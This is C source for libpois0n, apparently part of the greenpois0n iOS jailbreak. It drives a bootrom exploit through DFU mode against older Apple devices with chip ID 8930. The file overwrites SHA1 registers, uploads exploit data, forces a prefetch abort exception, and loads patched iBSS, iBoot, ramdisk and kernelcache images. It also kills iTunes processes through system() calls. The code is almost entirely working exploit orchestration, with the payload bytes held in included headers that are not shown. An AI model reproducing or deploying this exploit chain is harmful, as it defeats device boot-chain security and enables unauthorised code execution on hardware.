#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include "libpois0n.h"
#include "libpartial.h"
#include "libirecovery.h"

#include "exploit.h"
#include "ramdisk.h"
#include "payloads/iBSS.k66ap.h"
#include "payloads/iBSS.k48ap.h"
#include "payloads/iBSS.n90ap.h"
#include "payloads/iBSS.n81ap.h"
#include "payloads/iBoot.k66ap.h"
//#include "payloads/iBoot.k48ap.h"
#include "payloads/iBoot.n90ap.h"
#include "payloads/iBoot.n81ap.h"

int libpois0n_debug = 1;
static irecv_client_t client = NULL;
static irecv_device_t device = NULL;
static pois0n_callback progress_callback = NULL;
static void* user_object = NULL;

int recovery_callback(irecv_client_t client, const irecv_event_t* event) {
	progress_callback(event->progress, user_object);
	return 0;
}

void download_callback(ZipInfo* info, CDFile* file, size_t progress) {
	double value = ((double) progress / (double) info->length) * 100.0;
	progress_callback(value, user_object);
}

int receive_data(int bytes) {
	char* buffer = NULL;
	irecv_error_t error = 0;

	buffer = (char*) malloc(bytes);
	if(buffer == NULL) {
		error("Out of memory\n");
		return -1;
	}

	error = irecv_recv_buffer(client, buffer, bytes);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		free(buffer);
		return -1;
	}

	free(buffer);
	return 0;
}

int fetch_image(const char* path, const char* output) {
	debug("Fetching %s...\n", path);
	if(download_file_from_zip(device->url, path, output, &download_callback) != 0) {
		error("Unable to fetch %s\n", path);
		return -1;
	}
	return 0;

}

int fetch_dfu_image(const char* type, const char* output) {
	char name[64];
	char path[255];

	memset(name, '\0', 64);
	memset(path, '\0', 255);
	snprintf(name, 63, "%s.%s.RELEASE.dfu", type, device->model);
	snprintf(path, 254, "Firmware/dfu/%s", name);

	debug("Preparing to fetch DFU image from Apple's servers\n");
	if(fetch_image(path, output)  < 0) {
		error("Unable to fetch DFU image from Apple's servers\n");
		return -1;
	}

	return 0;
}

int fetch_firmware_image(const char* type, const char* output) {
	char name[64];
	char path[255];

	memset(name, '\0', 64);
	memset(path, '\0', 255);
	snprintf(name, 63, "%s.%s.img3", type, device->model);
	snprintf(path, 254, "Firmware/all_flash/all_flash.%s.production/%s", device->model, name);

	debug("Preparing to fetch firmware image from Apple's servers\n");
	if(fetch_image(path, output)  < 0) {
		error("Unable to fetch firmware image from Apple's servers\n");
	}

	return 0;
}

int upload_dfu_image(const char* type) {
	char image[255];
	struct stat buf;
	irecv_error_t error = 0;

	memset(image, '\0', 255);
	snprintf(image, 254, "%s.%s", type, device->model);

	debug("Checking if %s already exists\n", image);
	if(stat(image, &buf) != 0) {
		if(fetch_dfu_image(type, image) < 0) {
			error("Unable to upload DFU image\n");
			return -1;
		}
	}

	if(client->mode != kDfuMode) {
		debug("Resetting device counters\n");
		error = irecv_reset_counters(client);
		if (error != IRECV_E_SUCCESS) {
			debug("%s\n", irecv_strerror(error));
			return -1;
		}
	}

	debug("Uploading %s to device\n", image);
	error = irecv_send_file(client, image, 1);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		return -1;
	}
}

int upload_firmware_image(const char* type) {
	char image[255];
	struct stat buf;
	irecv_error_t error = 0;

	memset(image, '\0', 255);
	snprintf(image, 254, "%s.%s", type, device->model);

	debug("Checking if %s already exists\n", image);
	if(stat(image, &buf) != 0) {
		if(fetch_firmware_image(type, image) < 0) {
			error("Unable to upload firmware image\n");
			return -1;
		}
	}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware image\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Uploading %s to device\n", image);
	error = irecv_send_file(client, image, 0);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware image\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}
}

int upload_firmware_payload(char* type) {
	int size = 0;
	char* payload = NULL;
	irecv_error_t error = 0;

	switch(device->index) {
	case DEVICE_APPLETV2:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_k66ap;
			size = sizeof(iBSS_k66ap);
			debug("Loaded payload for iBSS on k66ap\n0");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_k66ap;
			//size = sizeof(iBEC_k66ap);
			debug("Loaded payload for iBEC on k66ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_k66ap;
			size = sizeof(iBoot_k66ap);
			debug("Loaded payload for iBoot on k66ap\n");
		}
		break;

	case DEVICE_IPAD1G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_k48ap;
			size = sizeof(iBSS_k48ap);
			debug("Loaded payload for iBSS on k48ap\n0");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_k48ap;
			//size = sizeof(iBEC_k48ap);
			debug("Loaded payload for iBEC on k48ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			//payload = iBoot_k48ap;
			//size = sizeof(iBoot_k48ap);
			debug("Loaded payload for iBoot on k48ap\n");
		}
		break;

	case DEVICE_IPHONE4:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n90ap;
			size = sizeof(iBSS_n90ap);
			debug("Loaded payload for iBSS on n90ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n90ap;
			//size = sizeof(iBEC_n90ap);
			debug("Loaded payload for iBEC on n90ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n90ap;
			size = sizeof(iBoot_n90ap);
			debug("Loaded payload for iBoot on n90ap\n");
		}
		break;

	case DEVICE_IPOD4G:
		if(!strcmp(type, "iBSS")) {
			payload = iBSS_n81ap;
			size = sizeof(iBSS_n81ap);
			debug("Loaded payload for iBSS on n81ap\n");
		}
		if(!strcmp(type, "iBEC")) {
			//payload = iBEC_n81ap;
			//size = sizeof(iBEC_n81ap);
			debug("Loaded payload for iBEC on n81ap\n");
		}
		if(!strcmp(type, "iBoot")) {
			payload = iBoot_n81ap;
			size = sizeof(iBoot_n81ap);
			debug("Loaded payload for iBoot on n81ap\n");
		}
		break;
	}

	if(payload == NULL) {
		error("Unable to upload firmware payload\n");
		return -1;
	}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware payload\n");
		debug("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Uploading iBSS payload\n");
	error = irecv_send_buffer(client, (unsigned char*) payload, size, 1);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to upload firmware payload\n");
		return -1;
	}

	return 0;
}

int overwrite_sha1_registers() {
	irecv_error_t error = 0;

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Shifting upload pointer\n");
	if(receive_data(0x80)) {
		error("Unable to shift upload counter\n");
		return -1;
	}

	debug("Resetting device\n");
	irecv_reset(client);

	debug("Finishing shift transaction\n");
	error = irecv_finish_transfer(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	debug("Overwriting SHA1 registers\n");
	if(receive_data(0x2C000)) {
		error("Unable to overwrite SHA1 registers\n");
		return -1;
	}
	
	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	return 0;
}

int upload_exploit() {
	irecv_error_t error = 0;

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Shifting upload pointer\n");
	if(receive_data(0x140)) {
		error("Unable to shift upload counter\n");
		return -1;
	}

	debug("Resetting device\n");
	irecv_reset(client);

	debug("Finishing shift transaction\n");
	error = irecv_finish_transfer(client);
	if (error != IRECV_E_SUCCESS) {
		error("%s\n", irecv_strerror(error));
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect to device\n");
		return -1;
	}

	debug("Sending exploit data\n");
	error = irecv_send_buffer(client, (unsigned char*) exploit, sizeof(exploit), 0);
	if(error != IRECV_E_SUCCESS) {
		error("Unable to send exploit data\n");
		return -1;
	}

	debug("Forcing prefetch abort exception\n");
	if(receive_data(0x2C000)) {
		error("Unable to force prefetch abort exception\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to reconnect\n");
		return -1;
	}

	return 0;
}

int upload_ibss() {
	if(upload_dfu_image("iBSS") < 0) {
		error("Unable upload iBSS\n");
		return -1;
	}
	return 0;
}

int upload_iboot() {
	if(upload_firmware_image("iBoot") < 0) {
		error("Unable upload iBoot\n");
		return -1;
	}
	return 0;
}

int upload_devicetree() {
	if(upload_firmware_image("DeviceTree") < 0) {
		error("Unable upload DeviceTree\n");
		return -1;
	}
	return 0;
}

int upload_ramdisk() {
	if(irecv_send_buffer(client, (unsigned char*) ramdisk, sizeof(ramdisk), 0) < 0) {
		error("Unable upload ramdisk\n");
		return -1;
	}
	return 0;
}

int upload_kernelcache() {
	struct stat buf;
	char kernelcache[255];
	irecv_error_t error = 0;

	memset(kernelcache, '\0', 255);
	memset(&buf, '\0', sizeof(buf));
	snprintf(kernelcache, 254, "kernelcache.release.%c%c%c", device->model[0], device->model[1], device->model[2]);
	debug("Checking if kernelcache already exists\n");
	if(stat(kernelcache, &buf) != 0) {
		if(fetch_image(kernelcache, kernelcache) < 0) {
			error("Unable to upload kernelcache\n");
			return -1;
		}
	}

	debug("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable upload kernelcache\n");
		return -1;
	}

	error = irecv_send_file(client, kernelcache, 1);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable upload kernelcache\n");
		return -1;
	}

	return 0;
}

int upload_ibss_payload() {
	if(upload_firmware_payload("iBSS") < 0) {
		error("Unable to upload iBSS payload\n");
		return -1;
	}
	return 0;
}

int upload_ibec_payload() {
	if(upload_firmware_payload("iBEC") < 0) {
		error("Unable to upload iBEC payload\n");
		return -1;
	}
	return 0;
}

int boot_ramdisk() {
	irecv_error_t error = 0;

	debug("Preparing to upload DeviceTree\n");
	if(upload_devicetree() < 0) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	debug("Executing DeviceTree\n");
	error = irecv_send_command(client, "devicetree");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	debug("Preparing to upload ramdisk\n");
	if(upload_ramdisk() < 0) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	debug("Executing ramdisk\n");
	error = irecv_send_command(client, "ramdisk");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	debug("Preparing to upload kernelcache\n");
	if(upload_kernelcache() < 0) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	debug("Preping and patching kernelcache\n");
	error = irecv_send_command(client, "go kernel load 0x41000000 0xF00000");
	if(error != IRECV_E_SUCCESS) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	return 0;
}

int boot_tethered() {
	irecv_error_t error = 0;

	irecv_setenv(client, "auto-boot", "false");
	irecv_saveenv(client);

	debug("Loading and patching iBoot\n");
	irecv_send_command(client, "go image load 0x69626F74 0x41000000");
	irecv_send_command(client, "go patch 0x41000000 0x38000");
	irecv_send_command(client, "go jump 0x41000040");

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 10);
	if (client == NULL) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	irecv_setenv(client, "auto-boot", "true");
	irecv_saveenv(client);

	// Warning this payload will be broken since we can assume
	//   we have the correct offset, only use commands that don't
	//   need specific offsets!!!!
	if(upload_firmware_payload("iBoot") < 0) {
		error("Unable to boot the device tethered\n");
		return -1;
	}

	debug("Initializing greenpois0n in iBoot\n");
	irecv_send_command(client, "go");

	//irecv_setenv(client, "boot-args", "0");
	//irecv_setenv(client, "auto-boot", "true");
	//irecv_saveenv(client);

	irecv_send_command(client, "go fsboot");

	return 0;
}

int boot_verbose() {
	return 0;
}

int execute_ibss_payload() {
	int i = 0;
	char* bootargs = NULL;
	irecv_error_t error = 0;

	debug("Initializing greenpois0n in iBSS\n");
	irecv_send_command(client, "go");

	// Code to detect whether to boot ramdisk or filesystem
	debug("Checking if device is already jailbroken\n");
	error = irecv_getenv(client, "boot-args", &bootargs);
	if(error != IRECV_E_SUCCESS) {
		debug("%s\n", irecv_strerror(error));
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	// If boot-args hasn't been set then we've never been jailbroken
	if(!strcmp(bootargs, "") || !strcmp(bootargs, "0")) {
		debug("Booting jailbreak ramdisk\n");
		//error = irecv_setenv(client, "boot-args", "1");
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		error = irecv_setenv(client, "auto-boot", "true");
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		error = irecv_saveenv(client);
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		if(boot_ramdisk() < 0) {
			error("Unable to boot device into tethered mode\n");
			return -1;
		}
	}
	// If boot-args is 1 then boot device into tethered mode
	else if(!strcmp(bootargs, "1")) {
		debug("Booting tethered device\n");
		if(boot_tethered() < 0) {
			error("Unable to boot device into tethered mode\n");
			return -1;
		}
	}
	// If boot-args is 2 then boot tethered in verbose (needed?)
	else if(!strcmp(bootargs, "2")) {
		debug("Booting device in verbose mode\n");
		if(boot_verbose() < 0) {
			error("Unable to boot device into verbose mode\n");
			return -1;
		}
	}
	// If boot-args is 3, then don't boot kernel, just execute payload
	else if(!strcmp(bootargs, "3")) {
		debug("Booting iBSS in payload mode\n");
		return 0;
	}
	// This is for testing!
	//   it will alternate between booting ramdisk and filesystm
	else if(!strcmp(bootargs, "4")) {
		debug("Booting ramdisk in debug mode\n");
		error = irecv_setenv(client, "boot-args", "5");
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		error = irecv_setenv(client, "auto-boot", "false");
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		error = irecv_saveenv(client);
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		if(boot_ramdisk() < 0) {
			error("Unable to boot jailbreaking ramdisk\n");
			return -1;
		}
		return 0;
	}
	else if(!strcmp(bootargs, "5")) {
		debug("Booting filesystem in debug mode\n");
		error = irecv_setenv(client, "boot-args", "4");
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		error = irecv_saveenv(client);
		if(error != IRECV_E_SUCCESS) {
			error("Unable to execute iBSS payload\n");
			return -1;
		}

		if(boot_tethered() < 0) {
			error("Unable to boot tethered filesystem\n");
			return -1;
		}
	}

	return 0;
}

void pois0n_init() {
	irecv_init();
	//irecv_set_debug_level(libpois0n_debug);
	debug("Initializing libpois0n\n");
	#ifndef WIN32
		system("killall -9 iTunesHelper");
	#else
		system("TASKKILL /F /IM iTunes.exe > NUL");
		system("TASKKILL /F /IM iTunesHelper.exe > NUL");
	#endif
}

void pois0n_set_callback(pois0n_callback callback, void* object) {
	progress_callback = callback;
	user_object = object;
}

int pois0n_is_ready() {
	irecv_error_t error = 0;

	//////////////////////////////////////
	// Begin
	// debug("Connecting to device\n");
	error = irecv_open(&client);
	if (error != IRECV_E_SUCCESS) {
		debug("Device must be in DFU mode to continue\n");
		return -1;
	}
	irecv_event_subscribe(client, IRECV_PROGRESS, &recovery_callback, NULL);

	//////////////////////////////////////
	// Check device
	// debug("Checking the device mode\n");
	if (client->mode != kDfuMode) {
		error("Device must be in DFU mode to continue\n");
		irecv_close(client);
		return -1;
	}

	return 0;
}

int pois0n_is_compatible() {
	irecv_error_t error = 0;
	info("Checking if device is compatible with this jailbreak\n");

	debug("Checking the device type\n");
	error = irecv_get_device(client, &device);
	if (device == NULL || device->index == DEVICE_UNKNOWN) {
		error("Sorry device is not compatible with this jailbreak\n");
		return -1;
	}
	info("Identified device as %s\n", device->product);

	if (device->chip_id != 8930) {
		error("Sorry device is not compatible with this jailbreak\n");
		return -1;
	}

	return 0;
}

void pois0n_exit() {
	debug("Exiting libpois0n\n");
	irecv_close(client);
	irecv_exit();
}

int pois0n_inject() {
	//////////////////////////////////////
	// Send exploit
	debug("Preparing to overwrite SHA1 registers\n");
	if(overwrite_sha1_registers() < 0) {
		error("Unable to overwrite SHA1 registers\n");
		return -1;
	}
	
	debug("Preparing to upload exploit data\n");
	if(upload_exploit() < 0) {
		error("Unable to upload exploit data\n");
		return -1;
	}

	//////////////////////////////////////
	// Send iBSS
	debug("Preparing to upload iBSS\n");
	if(upload_ibss() < 0) {
		error("Unable to upload iBSS\n");
		return -1;
	}

	debug("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		error("Unable to reconnect\n");
		return -1;
	}

	debug("Preparing to upload iBSS payload\n");
	if(upload_ibss_payload() < 0) {
		error("Unable to upload iBSS payload\n");
		return -1;
	}

	debug("Executing iBSS payload\n");
	if(execute_ibss_payload() < 0) {
		error("Unable to execute iBSS payload\n");
		return -1;
	}

	//////////////////////////////////////
	// Send iBEC
	/*debug("Disconnecting from device\n");
	debug("Preparing to upload iBEC payload\n");
	if(upload_ibec_payload() < 0) {
		error("Unable to upload iBEC payload\n");
		quit();
		return -1;
	}

	debug("Executing iBEC payload\n");
	if(execute_ibec_payload() < 0) {
		error("Unable to exiBSiBSSSecute iBEC payload\n");
		quit();
		return -1;
	}
	*/

	//////////////////////////////////////
	// Send ramdisk
	/*
	debug("Preparing to upload ramdisk\n");
	if(upload_ramdisk() < 0) {
		error("Unable to upload ramdisk\n");
		quit();
		return -1;
	}

	debug("Executing ramdisk\n");
	if(execute_ramdisk() < 0) {
		error("Unable to execute ramdisk\n");
		quit();
		return -1;
	}
	*/

	//////////////////////////////////////
	// End

	return 0;
}
